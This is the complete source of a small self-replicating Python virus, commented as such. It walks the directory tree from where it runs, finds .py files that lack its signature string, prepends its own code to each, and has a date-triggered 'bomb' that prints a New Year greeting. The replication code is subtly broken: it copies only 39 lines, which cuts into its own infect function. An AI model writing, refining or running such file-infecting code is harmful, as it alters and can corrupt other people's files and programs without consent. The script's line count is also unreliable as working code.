#!/usr/bin/python
import os
import datetime

# 
SIGNATURE = "WhopBopALooBopALopBamBoom!"

# This function recursively searches through directories to find Python files (*.py) 
# that have not been infected yet. It returns a list of files to infect.
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

# This function takes a list of files to infect and injects virus code into them. 
# It reads the virus code from the current script and inserts it at the beginning of each target file.
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# This function checks if the current date is January 1st. 
# If it is, it prints a happy new year message
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 1:
        print("Happy New  Year!")

filestoinfect = search(os.path.abspath(""))

# Print each file
for file in filestoinfect:
    print(file)

infect(filestoinfect)

bomb()